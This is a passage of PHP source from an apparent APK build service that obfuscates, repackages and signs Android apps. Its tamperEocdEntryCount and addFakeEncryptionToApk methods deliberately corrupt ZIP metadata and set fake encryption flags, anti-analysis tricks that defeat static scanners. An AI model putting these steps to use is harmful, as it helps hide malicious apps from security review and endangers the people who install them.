        // 检查 R8 输出
        $r8DexFiles = glob($outDir . '/classes*.dex');
        if (empty($r8DexFiles)) {
            Log::channel('apk')->warning('R8 produced no DEX output', [
                'output' => $result ? $result->output() : 'null',
            ]);

            return;
        }

        // Step 5: 替换 APK 中的 DEX 文件
        $zip = new \ZipArchive();
        if ($zip->open($unsignedApk) !== true) {
            return;
        }

        // 删除原始 DEX
        foreach ($dexFiles as $dexFile) {
            $zip->deleteName($dexFile);
        }

        // 添加 R8 混淆后的 DEX
        foreach ($r8DexFiles as $r8Dex) {
            $zip->addFile($r8Dex, basename($r8Dex));
        }

        $zip->close();

        Log::channel('apk')->debug('R8 obfuscation applied', [
            'input_dex' => count($dexFiles),
            'output_dex' => count($r8DexFiles),
        ]);
    }

    /**
     * 运行 APKEditor 重打包 — 对应旧版 `java -jar APKEditor.jar p -i <apk>`。
     *
     * APKEditor 会重新打包 APK 的 ZIP 结构，使其更接近正常应用的结构。
     * 旧版仅在 Store 模式且 notifymsg != "off" 时执行此步骤。
     * 输出文件名为原文件名加 _protected 后缀。
     */
    private function runApkEditor(): void
    {
        $apkEditorJar = $this->toolsDir . '/APKEditor.jar';

        if (! $this->fileSystem->exists($apkEditorJar)) {
            Log::channel('apk')->warning('APKEditor.jar not found, skipping APK editor step', [
                'path' => $apkEditorJar,
            ]);

            return;
        }

        $unsignedApk = $this->getUnsignedApkPath();

        // 旧版命令: java -jar -Xms4096M -Xmx6144M APKEditor.jar p -i <apk>
        // 输出文件自动为 <apk>_protected.apk（APKEditor 默认行为）
        $command = sprintf(
            'java -jar -Xms4096M -Xmx6144M %s p -i %s',
            escapeshellarg($apkEditorJar),
            escapeshellarg($unsignedApk)
        );

        $timeout = config('apk-builder.timeout', 300);
        $result = $this->runCommandWithHeartbeat($command, $timeout);

        // APKEditor 输出文件名: app-unsigned_protected.apk
        $protectedApk = str_replace('.apk', '_protected.apk', $unsignedApk);

        if ($result !== null && $result->successful() && $this->fileSystem->exists($protectedApk)) {
            // 删除原始文件，将 protected 文件重命名为原始文件名
            $this->fileSystem->delete($unsignedApk);
            $this->fileSystem->copy($protectedApk, $unsignedApk);
            $this->fileSystem->delete($protectedApk);
            Log::channel('apk')->debug('APKEditor repackaged APK successfully');
        } else {
            Log::channel('apk')->warning('APKEditor failed, continuing with original APK', [
                'output' => $result ? $result->output() : 'null',
                'error' => $result ? $result->errorOutput() : 'null',
            ]);
        }
    }

    private function protectApk(): void
    {
        $protector = ($this->apkProtectorFactory)($this->currentConfig);
        $signedApk = $this->workDir . '/' . ApkBuilderConstants::APK_SIGNED;
        $protector->protect($signedApk);
        Log::channel('apk')->debug('APK protection applied');
    }

    private function tamperEocdEntryCount(): void
    {
        $apkPath = $this->getUnsignedApkPath();

        $data = file_get_contents($apkPath);
        $eocdSig = "\x50\x4b\x05\x06";
        $eocdPos = strrpos($data, $eocdSig);

        if ($eocdPos === false) {
            Log::channel('apk')->warning('EOCD not found, skipping tamper');
            return;
        }

        $currentEntries = unpack('v', substr($data, $eocdPos + 10, 2))[1];
        $newEntries = max(0, $currentEntries - 1);

        $tampered = pack('v', $newEntries);
        $data[$eocdPos + 8] = $tampered[0];
        $data[$eocdPos + 9] = $tampered[1];
        $data[$eocdPos + 10] = $tampered[0];
        $data[$eocdPos + 11] = $tampered[1];

        file_put_contents($apkPath, $data);
        Log::channel('apk')->debug("EOCD entry count tampered: {$currentEntries} -> {$newEntries}");
    }

    private function addFakeEncryptionToApk(): void
    {
        $apkPath = $this->getUnsignedApkPath();
        if (! $this->fileSystem->exists($apkPath)) {
            return;
        }

        $protector = ($this->apkProtectorFactory)($this->currentConfig);
        $protector->applyFakeEncryption($apkPath);
        Log::channel('apk')->debug('Fake encryption flags applied to APK');
    }

    private function modifyDex(): void
    {
        $protector = ($this->apkProtectorFactory)($this->currentConfig);
        $count = $protector->modifyDex($this->getUnsignedApkPath());
        Log::channel('apk')->debug('DEX files modified', ['count' => $count]);
    }

    private function signApk(): void
    {
        $unsignedApk = $this->getUnsignedApkPath();
        $alignedApk = $this->workDir . '/' . ApkBuilderConstants::APK_ALIGNED;
        $signedApk = $this->workDir . '/' . ApkBuilderConstants::APK_SIGNED;
        $androidSdkTools = ApkBuilderConstants::DEFAULT_ANDROID_SDK_TOOLS;
        $zipalignPath = $androidSdkTools . '/zipalign';

        // 旧版: zipalign 4 <input> <output>
        $alignCommand = sprintf(
            '%s -f 4 %s %s',
            escapeshellarg($zipalignPath),
            escapeshellarg($unsignedApk),
            escapeshellarg($alignedApk)
        );
        $alignResult = $this->processRunner->run($alignCommand);
        $apkToSign = $alignResult->successful() && $this->fileSystem->exists($alignedApk) ? $alignedApk : $unsignedApk;

        // 旧版签名: java -jar signapk.jar sign --key key.pk8 --cert certificate.pem
        //           --v2-signing-enabled true --v3-signing-enabled false --out <output> <input>
        $signapkJar = $this->toolsDir . '/signapk.jar';
        $certPem = $this->toolsDir . '/certificate.pem';
        $keyPk8 = $this->toolsDir . '/key.pk8';

        if ($this->fileSystem->exists($signapkJar) && $this->fileSystem->exists($certPem) && $this->fileSystem->exists($keyPk8)) {
            Log::channel('apk')->info('Signing APK with signapk.jar (legacy mode)', [
                'signapk' => $signapkJar,
            ]);

            $command = sprintf(
                'java -jar %s sign --key %s --cert %s --v1-signing-enabled false --v2-signing-enabled true --v3-signing-enabled false --out %s %s',
                escapeshellarg($signapkJar),
                escapeshellarg($keyPk8),
                escapeshellarg($certPem),
                escapeshellarg($signedApk),
                escapeshellarg($apkToSign)
            );
            $result = $this->processRunner->run($command);
            Log::channel('apk')->debug('signapk.jar result', [
                'success' => $result->successful(),
                'output' => $result->output(),
                'error' => $result->errorOutput(),
            ]);
        }

        // fallback: apksigner with keystore (v2=true, v3=false)
        if (! $this->fileSystem->exists($signedApk)) {
            $apksignerPath = $androidSdkTools . '/apksigner';

            if ($this->fileSystem->exists($apksignerPath)) {
                $keystoreInfo = $this->resolveKeystore();
                $keystore = $keystoreInfo['path'];
                $keystorePass = $keystoreInfo['keystore_pass'];
                $keyAlias = $keystoreInfo['key_alias'];
                $keyPass = $keystoreInfo['key_pass'];

                Log::channel('apk')->info('Signing APK with apksigner (fallback)', [
                    'mode' => $keystoreInfo['mode'],
                    'keystore' => $keystore,
                    'alias' => $keyAlias,
                ]);

                $command = sprintf(
                    '%s sign --ks %s --ks-pass pass:%s --ks-key-alias %s --key-pass pass:%s --v1-signing-enabled false --v2-signing-enabled true --v3-signing-enabled false --out %s %s',
                    escapeshellarg($apksignerPath),
                    escapeshellarg($keystore),
                    escapeshellarg($keystorePass),
                    escapeshellarg($keyAlias),
                    escapeshellarg($keyPass),
                    escapeshellarg($signedApk),
                    escapeshellarg($apkToSign)
                );
                $result = $this->processRunner->run($command);
                Log::channel('apk')->debug('apksigner result', [
                    'success' => $result->successful(),
                    'output' => $result->output(),
                    'error' => $result->errorOutput(),
                ]);
            }
        }

        // fallback: jarsigner（仅 v1 签名）
        if (! $this->fileSystem->exists($signedApk)) {
            $keystoreInfo = $keystoreInfo ?? $this->resolveKeystore();
            $command = sprintf(
                'jarsigner -keystore %s -storepass %s -keypass %s -signedjar %s %s %s',
                escapeshellarg($keystoreInfo['path']),
                escapeshellarg($keystoreInfo['keystore_pass']),
                escapeshellarg($keystoreInfo['key_pass']),
                escapeshellarg($signedApk),
                escapeshellarg($apkToSign),
                escapeshellarg($keystoreInfo['key_alias'])
            );
            $result = $this->processRunner->run($command);
            Log::channel('apk')->debug('jarsigner result', [
                'success' => $result->successful(),
                'output' => $result->output(),
                'error' => $result->errorOutput(),
            ]);
        }

        if (! $this->fileSystem->exists($signedApk)) {
            throw ApkBuildException::signingFailed('All signing methods failed');
        }
    }

    /**
     * 解析 keystore 配置，返回路径、密码、别名等信息。
     *
     * 优先级：
     * 1. 用户通过环境变量提供的 release keystore
     * 2. 自动生成的 release keystore（持久保存在 tools 目录）
     * 3. debug keystore（仅当 signing.mode = debug 时）
     *
     * @return array{mode: string, path: string, keystore_pass: string, key_alias: string, key_pass: string}
     */
    private function resolveKeystore(): array
    {
        $mode = config('apk-builder.signing.mode', 'release');

        // 1. 用户提供的 keystore（优先级最高）
        $userKeystorePath = config('apk-builder.signing.keystore_path');
        if (! empty($userKeystorePath) && $this->fileSystem->exists($userKeystorePath)) {
            return [
                'mode' => 'release-custom',
                'path' => $userKeystorePath,
                'keystore_pass' => config('apk-builder.signing.keystore_pass', ''),
                'key_alias' => config('apk-builder.signing.key_alias', ''),
                'key_pass' => config('apk-builder.signing.key_pass', ''),
            ];
        }

        // 2. debug 模式：使用传统 debug keystore
        if ($mode === 'debug') {
            $debugKeystore = $this->toolsDir . '/' . ApkBuilderConstants::DEBUG_KEYSTORE_FILENAME;
            if (! $this->fileSystem->exists($debugKeystore)) {
                $this->generateDebugKeystore($debugKeystore);
            }

            return [
                'mode' => 'debug',
                'path' => $debugKeystore,
                'keystore_pass' => 'android',
                'key_alias' => 'androiddebugkey',
                'key_pass' => 'android',
            ];
        }

        // 3. release 模式：使用自动生成的 release keystore
        $releaseKeystore = $this->toolsDir . '/' . ApkBuilderConstants::RELEASE_KEYSTORE_FILENAME;
        $metaPath = $this->toolsDir . '/' . ApkBuilderConstants::KEYSTORE_META_FILENAME;

        if ($this->fileSystem->exists($releaseKeystore) && $this->fileSystem->exists($metaPath)) {
            $meta = json_decode($this->fileSystem->get($metaPath), true);
            if (is_array($meta) && ! empty($meta['key_alias']) && ! empty($meta['keystore_pass'])) {
                return [
                    'mode' => 'release-auto',
                    'path' => $releaseKeystore,
                    'keystore_pass' => $meta['keystore_pass'],
                    'key_alias' => $meta['key_alias'],
                    'key_pass' => $meta['key_pass'] ?? $meta['keystore_pass'],
                ];
            }
        }

        // 自动生成 release keystore
        return $this->generateReleaseKeystore($releaseKeystore, $metaPath);
    }

    /**
     * 生成 release 级别的 keystore 并持久保存元数据。
     *
     * @return array{mode: string, path: string, keystore_pass: string, key_alias: string, key_pass: string}
     */
    private function generateReleaseKeystore(string $keystorePath, string $metaPath): array
    {
        $autoConfig = config('apk-builder.signing.auto_generate', []);
        $keyAlg = $autoConfig['key_alg'] ?? 'RSA';
        $keySize = $autoConfig['key_size'] ?? 2048;
        $validity = $autoConfig['validity'] ?? 36500;
        $dname = $autoConfig['dname'] ?? 'CN=App,OU=Mobile,O=Company,L=City,ST=State,C=CN';

        $keyAlias = ApkBuilderConstants::AUTO_KEY_ALIAS_PREFIX . bin2hex(random_bytes(4));
        $keystorePass = bin2hex(random_bytes(ApkBuilderConstants::AUTO_KEYSTORE_PASS_LENGTH / 2));
        $keyPass = $keystorePass;

        $this->fileSystem->ensureDirectoryExists(dirname($keystorePath));

        $command = sprintf(
            'keytool -genkey -v -keystore %s -storepass %s -alias %s -keypass %s -keyalg %s -keysize %d -validity %d -dname %s',
            escapeshellarg($keystorePath),
            escapeshellarg($keystorePass),
            escapeshellarg($keyAlias),
            escapeshellarg($keyPass),
            escapeshellarg($keyAlg),
            $keySize,
            $validity,
            escapeshellarg($dname)
        );

        $result = $this->processRunner->run($command);

        if (! $this->fileSystem->exists($keystorePath)) {
            throw ApkBuildException::signingFailed(
                'Failed to generate release keystore: ' . ($result->errorOutput() ?: $result->output())
            );
        }

        // 持久保存元数据
        $meta = [
            'key_alias' => $keyAlias,
            'keystore_pass' => $keystorePass,
            'key_pass' => $keyPass,
            'key_alg' => $keyAlg,
            'key_size' => $keySize,
            'validity' => $validity,
            'dname' => $dname,
            'created_at' => date('Y-m-d H:i:s'),
        ];
        $this->fileSystem->put($metaPath, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

        Log::channel('apk')->info('Generated release keystore', [
            'path' => $keystorePath,
            'alias' => $keyAlias,
            'validity_days' => $validity,
        ]);

        return [
            'mode' => 'release-auto',
            'path' => $keystorePath,
            'keystore_pass' => $keystorePass,
            'key_alias' => $keyAlias,
            'key_pass' => $keyPass,
        ];
    }

    /**
     * 生成 debug keystore（仅在 debug 模式下使用）。
     */
    private function generateDebugKeystore(string $path): void
    {
        $command = sprintf(
            'keytool -genkey -v -keystore %s -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Debug,O=Android,C=US"',
            escapeshellarg($path)
        );
        $this->processRunner->run($command);
    }

    private function moveToOutput(ApkBuildConfig $config): string
    {
        $signedApk = $this->workDir . '/' . ApkBuilderConstants::APK_SIGNED;
        $outputDir = $this->outputDir . '/' . $config->userId . '/' . $config->appId;

        $this->fileSystem->ensureDirectoryExists($outputDir);

        $outputPath = $outputDir . '/' . $config->appId . '.apk';

        if (! $this->fileSystem->copy($signedApk, $outputPath)) {
            throw ApkBuildException::outputFailed('Failed to copy APK file');
        }

        return '/storage/apk/' . $config->userId . '/' . $config->appId . '/' . $config->appId . '.apk';
    }

    private function cleanup(): void
    {
        if (empty($this->workDir) || ! $this->fileSystem->isDirectory($this->workDir)) {
            return;
        }

        $configKey = $this->buildSucceeded ? 'cleanup_on_success' : 'cleanup_on_failure';
        $shouldCleanup = config("apk-builder.{$configKey}", true);

        if ($shouldCleanup) {
            $this->fileSystem->deleteDirectory($this->workDir);
        }
    }

    private function copyDirectory(string $src, string $dst): void
    {
        $timeout = config('apk-builder.timeout', 300);

        $command = sprintf('rsync -a %s/ %s/', escapeshellarg($src), escapeshellarg($dst));
        $result = $this->runCommandWithHeartbeat($command, $timeout);

        if ($result !== null && $result->successful()) {
            return;
        }

        $command = sprintf(
            'tar -C %s -cf - . | tar -C %s -xf -',
            escapeshellarg($src),
            escapeshellarg($dst)
        );
        $this->fileSystem->ensureDirectoryExists($dst);
        $result = $this->runCommandWithHeartbeat($command, $timeout);

        if ($result !== null && $result->successful()) {
            return;
        }

        $this->copyDirectoryWithHeartbeat($src, $dst);
    }

    private function runCommandWithHeartbeat(string $command, int $timeout): ?\Illuminate\Contracts\Process\ProcessResult
    {
        $process = $this->processRunner->start($command, $timeout);
        $heartbeatInterval = ApkBuilderConstants::HEARTBEAT_INTERVAL_SEC;
        $lastHeartbeat = time();

        while ($process->running()) {
            if (time() - $lastHeartbeat >= $heartbeatInterval) {
                $this->emitHeartbeat();
                $lastHeartbeat = time();
            }
            usleep(ApkBuilderConstants::PROCESS_POLL_INTERVAL_US);
        }

        return $process->wait();
    }

    private function copyDirectoryWithHeartbeat(string $src, string $dst): void
    {
        $dirIterator = new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS);
        $iterator = new RecursiveIteratorIterator($dirIterator, RecursiveIteratorIterator::SELF_FIRST);

        $this->fileSystem->ensureDirectoryExists($dst);
        $count = 0;
        $heartbeatInterval = ApkBuilderConstants::FILE_COPY_HEARTBEAT_INTERVAL;
        $srcLen = strlen(rtrim($src, DIRECTORY_SEPARATOR)) + 1;

        foreach ($iterator as $item) {
            /** @var \SplFileInfo $item */
            $relativePath = substr($item->getPathname(), $srcLen);
            $target = $dst . DIRECTORY_SEPARATOR . $relativePath;

            if ($item->isDir()) {
                $this->fileSystem->ensureDirectoryExists($target);
            } else {
                $this->fileSystem->copy($item->getPathname(), $target);
            }

            $count++;
            if ($count % $heartbeatInterval === 0) {
                $this->emitHeartbeat();
            }
        }
    }
}
